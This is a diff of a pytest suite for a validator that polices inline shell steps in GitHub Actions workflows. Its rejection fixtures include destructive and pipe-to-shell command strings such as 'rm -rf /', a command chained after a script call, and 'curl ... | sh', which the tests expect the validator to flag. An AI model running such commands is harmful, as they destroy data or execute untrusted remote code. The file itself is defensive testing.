@@ -14,21 +14,28 @@ rule, not listed.
 from __future__ import annotations
 
 import importlib
+import shutil
 from collections.abc import Callable
 from pathlib import Path
 from types import ModuleType
 
 import pytest
 from assertpy import assert_that
+from inline_shell_support import (
+    HEADER,
+    PRESET,
+    ROOT,
+    SCRIPT,
+    SCRIPT_PATH,
+    categories,
+    make_repo,
+    preset_copy,
+    problems,
+    step,
+    write_workflow,
+)
 
-ROOT = Path(__file__).resolve().parents[2]
-SCRIPT_PATH = "scripts/ci/quality/validate_inline_shell.py"
-SCRIPT = "scripts/ci/actions/example.sh"
-HEADER = "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
-# Hand-written code that only a generated block of whole steps may carry.
-MINT_LIKE = """[[ x == y ]] || { echo no; exit 1; }
-printf '%s' "$(id)" >> "$GITHUB_OUTPUT"
-"""
+MINT = "tooling-app-mint"
 
 
 @pytest.fixture(name="check")
@@ -44,46 +51,18 @@ def fixture_rules(check: ModuleType) -> ModuleType:
     return importlib.import_module("inline_shell_rules")
 
 
+@pytest.fixture(name="sync")
+def fixture_sync(check: ModuleType) -> ModuleType:
+    """Return the generator module the validator imported."""
+    del check
+    return importlib.import_module("sync_inline_blocks")
+
+
 @pytest.fixture(name="repo")
 def fixture_repo(tmp_path: Path) -> Path:
     """Return a scratch repository with one script and one action script."""
-    (tmp_path / "scripts" / "ci" / "actions").mkdir(parents=True)
-    (tmp_path / SCRIPT).write_text("#!/usr/bin/env bash\n", encoding="utf-8")
-    action = tmp_path / ".github" / "actions" / "demo"
-    action.mkdir(parents=True)
-    (action / "own.sh").write_text("#!/usr/bin/env bash\n", encoding="utf-8")
-    (tmp_path / ".github" / "workflows").mkdir(parents=True)
-    return tmp_path
-
-
-def step(run: str, name: str = "Step", env: dict[str, str] | None = None) -> str:
-    """Return one workflow step running ``run`` as a literal block."""
-    body = "".join(f"          {line}\n" if line else "\n" for line in run.split("\n"))
-    env_text = ""
-    if env:
-        pairs = "".join(f"          {k}: {v}\n" for k, v in env.items())
-        env_text = f"        env:\n{pairs}"
-    head = f"      - name: {name}\n        shell: bash\n{env_text}"
-    return f"{head}        run: |\n{body}"
-
-
-def write_workflow(repo: Path, *steps: str, name: str = "w.yml") -> None:
-    """Write a workflow with the given steps."""
-    path = repo / ".github" / "workflows" / name
-    path.write_text(HEADER + "".join(steps), encoding="utf-8")
-
-
-def problems(check: ModuleType, repo: Path) -> list[str]:
-    """Return the report lines for a scratch repository."""
-    steps, errors = check.check(repo)
-    lines: list[str] = check.report(steps, errors)
-    return lines
-
-
-def categories(check: ModuleType, repo: Path) -> list[str]:
-    """Return the class of each step, in file order."""
-    steps, _ = check.check(repo)
-    return [str(s.category) for s in steps]
+    repo: Path = make_repo(tmp_path)
+    return repo
 
 
 # The repository itself.
@@ -155,8 +134,13 @@ def test_cli_passes_on_the_repository(
         ),
         pytest.param("echo ${X//a/b}", "expansion ${X//a/b}", id="pattern-expansion"),
         pytest.param("echo ${X:=y}", "expansion ${X:=y}", id="assign-expansion"),
-        pytest.param("printf -v x y", "printf -v assigns", id="printf-v"),
+        pytest.param("printf -v x y", "printf takes no option", id="printf-v"),
         pytest.param("if [[ -f x ]]; then echo; fi", "test `-f`", id="file-test"),
+        pytest.param(
+            'echo "A=1" >>"${GITHUB_ENV}"',
+            "writes $GITHUB_ENV",
+            id="env-file",
+        ),
         pytest.param("echo 'unclosed", "cannot be read as shell", id="unclosed"),
         pytest.param(
             "diff <(echo a) <(echo b)",
@@ -205,9 +189,9 @@ def test_an_expression_in_a_generated_block_fails(
 ) -> None:
     """Rule 3 holds for every inline step, generated copies included."""
     run = (
-        "# lgtm-ci-inline:begin fail-unknown-egress-preset\n"
+        f"# lgtm-ci-inline:begin {PRESET}\n"
         "echo ${{ inputs.x }}\n"
-        "# lgtm-ci-inline:end fail-unknown-egress-preset"
+        f"# lgtm-ci-inline:end {PRESET}"
     )
     write_workflow(repo, step(run))
 
@@ -300,15 +284,11 @@ def test_case_on_a_compound_subject_fails(check: ModuleType, repo: Path) -> None
         pytest.param("true", id="true"),
         pytest.param("printf '%s\\n' \"${MESSAGE}\"\nexit 1", id="printf"),
         pytest.param('echo "a=${A:-none}" >> "$GITHUB_OUTPUT"', id="output"),
-        pytest.param('echo "A=1" >>"${GITHUB_ENV}"', id="env-file"),
+        pytest.param('echo "a=${A-none}" >>"${GITHUB_OUTPUT}"', id="output-braced"),
         pytest.param('echo "# Summary" >> "$GITHUB_STEP_SUMMARY"', id="summary"),
         pytest.param('echo "warn" >&2', id="stderr"),
         pytest.param('echo "warn" 1>&2', id="stderr-fd"),
-        pytest.param(
-            'if [[ "$MODE" == strict ]]; then\n  echo "::error::strict"\n  exit 1\n'
-            'elif [[ -n "$WARN" ]]; then\n  echo "::warning::$WARN"\nelse\n  true\nfi',
-            id="if-elif-else-7-lines",
-        ),
+        pytest.param('echo "warn" 2>&1', id="stdout-fd"),
         pytest.param(
             'case "$KIND" in\n  a|b) echo ab ;;\n  *) exit 1 ;;\nesac',
             id="case",
@@ -328,22 +308,33 @@ def test_case_on_a_compound_subject_fails(check: ModuleType, repo: Path) -> None
             id="continuation",
         ),
         pytest.param('[ "$X" = y ] && echo yes', id="single-bracket"),
-        pytest.param('test "$X" -eq 1 || exit 1', id="test-builtin"),
+        pytest.param('[ -z "$X" ] || echo set', id="single-bracket-unary"),
+        pytest.param('test -n "$X" || exit 1', id="test-builtin"),
+        pytest.param('[[ "$X" < "$Y" ]] && echo before', id="string-order"),
     ],
 )
 def test_trivial_steps_pass(check: ModuleType, repo: Path, run: str) -> None:
     """Reporting and stopping on plain variables is trivial."""
-    if run.count("\n") >= 5:
-        # Seven lines: only the line limit may fail, nothing else.
-        write_workflow(repo, step(run))
-        report = problems(check, repo)
-        assert_that(report).is_length(1)
-        assert_that(report[0]).contains("[rule 4: ")
-        return
     write_workflow(repo, step(run))
 
     assert_that(problems(check, repo)).is_empty()
     assert_that(categories(check, repo)).is_equal_to(["trivial"])
+
+
+def test_a_long_allowed_conditional_fails_only_the_line_limit(
+    check: ModuleType,
+    repo: Path,
+) -> None:
+    """Eight lines of if/elif/else break rule 4 and nothing else."""
+    run = (
+        'if [[ "$MODE" == strict ]]; then\n  echo "::error::strict"\n  exit 1\n'
+        'elif [[ -n "$WARN" ]]; then\n  echo "::warning::$WARN"\nelse\n  true\nfi'
+    )
+    write_workflow(repo, step(run))
+
+    report = problems(check, repo)
+    assert_that(report).is_length(1)
+    assert_that(report[0]).contains("[rule 4: at most 5 lines of code] 8 lines of code")
 
 
 # Script calls.
@@ -383,15 +374,20 @@ def test_trivial_steps_pass(check: ModuleType, repo: Path, run: str) -> None:
         ),
         pytest.param(
             'bash "$GITHUB_WORKSPACE/$CALLER_SCRIPT"',
-            {"CALLER_SCRIPT": "x"},
+            {"CALLER_SCRIPT": "${{ inputs.caller-script }}"},
             id="env-path",
         ),
-        pytest.param('bash "$CALLER_SCRIPT"', {"CALLER_SCRIPT": "x"}, id="env-whole"),
         pytest.param(
-            '".lgtm-ci-tooling/scripts/ci/release/${NAME}"',
-            {"NAME": "${{ inputs.n }}"},
+            'bash "$CALLER_SCRIPT"',
+            {"CALLER_SCRIPT": SCRIPT},
+            id="env-whole",
+        ),
+        pytest.param(
+            '".lgtm-ci-tooling/scripts/ci/actions/${NAME}"',
+            {"NAME": "${{ inputs.n != '' && 'example.sh' || 'example.sh' }}"},
             id="env-under-scripts",
         ),
+        pytest.param(f"bash scripts/../{SCRIPT}", None, id="normalised"),
         pytest.param(
             'bash "${RUNNER_TEMP}/check-tooling-ref-divergence.sh"',
             None,
@@ -420,7 +416,6 @@ def test_script_calls_pass(
         pytest.param("bash /tmp/x.sh", None, id="absolute"),
         pytest.param("bash ../scripts/x.sh", None, id="parent"),
         pytest.param("bash docs/x.sh", None, id="outside-scripts"),
-        pytest.param(f"bash scripts/../{SCRIPT}", None, id="normalised-ok-but-checked"),
         pytest.param('bash -c "rm -rf /"', None, id="bash-c"),
         pytest.param("python3 -c 'import os'", None, id="python-c"),
         pytest.param(f"bash {SCRIPT}; rm -rf /", None, id="second-command"),
@@ -448,11 +443,8 @@ def test_non_calls_fail(
     """Anything else is judged as hand-written code and fails here."""
     write_workflow(repo, step(run, env=env))
 
-    if run == f"bash scripts/../{SCRIPT}":
-        # Normalised, the path is the script: accepted, resolved correctly.
-        assert_that(problems(check, repo)).is_empty()
-        return
     assert_that(problems(check, repo)).is_not_empty()
+    assert_that(categories(check, repo)).is_equal_to(["violation"])
 
 
 def test_a_bad_path_says_why_it_is_not_a_call(check: ModuleType, repo: Path) -> None:
@@ -488,14 +480,13 @@ def test_composite_action_paths(check: ModuleType, repo: Path) -> None:
 # Generated copies.
 
 
-def test_marked_block_is_generated(check: ModuleType, repo: Path) -> None:
-    """A run: that is only a known marked block is a generated copy."""
-    run = (
-        "# lgtm-ci-inline:begin fail-unknown-egress-preset\n"
-        "curl https://example.invalid | sh\n"
-        "# lgtm-ci-inline:end fail-unknown-egress-preset"
-    )
-    write_workflow(repo, step(run))
+def test_marked_block_is_generated(
+    check: ModuleType,
+    repo: Path,
+    sync: ModuleType,
+) -> None:
+    """A run: that is only a known marked block, equal to its source, is generated."""
+    write_workflow(repo, step(preset_copy(sync)))
 
     assert_that(problems(check, repo)).is_empty()
     assert_that(categories(check, repo)).is_equal_to(["generated"])
@@ -523,7 +514,9 @@ def test_unknown_block_id_fails(check: ModuleType, repo: Path) -> None:
     write_workflow(repo, step(run))
 
     joined = "\n".join(problems(check, repo))
-    assert_that(joined).contains("unknown generated block id 'evil' [generated]")
+    expected = "[generated copy] line 8: unknown generated block id 'evil'"
+    assert_that(joined).contains(expected)
+    assert_that(categories(check, repo)).is_equal_to(["violation"])
 
 
 def test_unpaired_marker_fails(check: ModuleType, repo: Path) -> None:
@@ -532,21 +525,53 @@ def test_unpaired_marker_fails(check: ModuleType, repo: Path) -> None:
     write_workflow(repo, step(f"{begin}\nexit 1"))
 
     joined = "\n".join(problems(check, repo))
-    assert_that(joined).contains("has no end [generated]")
+    assert_that(joined).contains(
+        "[generated copy] line 8: begin fail-unknown-egress-preset has no end"
+    )
+    assert_that(categories(check, repo)).is_equal_to(["violation"])
 
 
-def test_steps_inside_a_yaml_block_are_generated(check: ModuleType, repo: Path) -> None:
+def test_steps_inside_a_yaml_block_are_generated(
+    check: ModuleType,
+    repo: Path,
+    sync: ModuleType,
+) -> None:
     """A block of whole steps (tooling-app-mint) covers the steps inside it."""
+    source = sync.BLOCKS[MINT].script
+    shutil.copy(ROOT / source, repo / source)
+    lines = sync.generated_body(MINT)
+    body = "".join(f"      {line}\n" if line else "\n" for line in lines)
     write_workflow(
         repo,
-        "      # lgtm-ci-inline:begin tooling-app-mint\n",
-        step(MINT_LIKE),
-        "      # lgtm-ci-inline:end tooling-app-mint\n",
+        f"      # lgtm-ci-inline:begin {MINT}\n{body}",
+        f"      # lgtm-ci-inline:end {MINT}\n",
         step("echo outside"),
     )
 
-    assert_that(categories(check, repo)).is_equal_to(["generated", "trivial"])
+    found = categories(check, repo)
     assert_that(problems(check, repo)).is_empty()
+    assert_that(found[-1]).is_equal_to("trivial")
+    assert_that(found[:-1]).is_not_empty()
+    assert_that(set(found[:-1])).is_equal_to({"generated"})
+
+
+def test_a_changed_step_in_a_yaml_block_fails(
+    check: ModuleType,
+    repo: Path,
+    sync: ModuleType,
+) -> None:
+    """Code hand-written inside a block of whole steps differs from its source."""
+    source = sync.BLOCKS[MINT].script
+    shutil.copy(ROOT / source, repo / source)
+    write_workflow(
+        repo,
+        f"      # lgtm-ci-inline:begin {MINT}\n",
+        step("curl https://example.invalid | sh"),
+        f"      # lgtm-ci-inline:end {MINT}\n",
+    )
+
+    assert_that(categories(check, repo)).is_equal_to(["violation"])
+    assert_that("\n".join(problems(check, repo))).contains("differs from its source")
 
 
 # Reading the files.
@@ -634,8 +659,48 @@ def test_limits_are_the_owner_decisions(rules: ModuleType) -> None:
         ["echo", "exit", "false", "printf", "true"],
     )
     assert_that(sorted(rules.RUNNER_FILES)).is_equal_to(
-        ["GITHUB_ENV", "GITHUB_OUTPUT", "GITHUB_STEP_SUMMARY"],
+        ["GITHUB_OUTPUT", "GITHUB_STEP_SUMMARY"],
     )
+    # No arithmetic (-eq ... -ge) and no -v: both evaluate a value as code.
+    assert_that(sorted(rules.TEST_OPERATORS)).is_equal_to(["-n", "-z"])
+    assert_that(sorted(rules.SHELLS)).is_equal_to(["bash", "sh"])
+
+
+# Each list the check enforces, as docs/inline-shell.md writes it under
+# "## Reference": "- `NAME`: `item`, `item`".
+LISTS = (
+    "ALLOWED_COMMANDS",
+    "RUNNER_FILES",
+    "TEST_OPERATORS",
+    "BRACKET_COMPARISONS",
+    "SHELLS",
+    "PROTECTED_ENV",
+    "INTERPRETERS",
+)
+
+
+@pytest.mark.parametrize("name", LISTS)
+def test_docs_list_each_set_exactly(rules: ModuleType, name: str) -> None:
+    """The documented reference list is the set the check uses, item for item."""
+    docs = (ROOT / "docs" / "inline-shell.md").read_text(encoding="utf-8")
+    reference = docs.split("## Reference", 1)[1]
+    prefix = f"- `{name}`:"
+    # A list item and the indented lines that continue it.
+    items = reference.replace("\n  ", " ").splitlines()
+    lines = [line for line in items if line.startswith(prefix)]
+    assert_that(lines).is_length(1)
+    listed = lines[0][len(prefix) :].split("(", 1)[0]
+    documented = set(listed.split("`")[1::2])
+    value = getattr(rules, name)
+    expected = (
+        {
+            f"{interpreter} {' '.join(sorted(options))}".strip()
+            for interpreter, options in value.items()
+        }
+        if isinstance(value, dict)
+        else set(value)
+    )
+    assert_that(documented).is_equal_to(expected)
 
 
 def test_staged_copy_source_exists(rules: ModuleType) -> None:
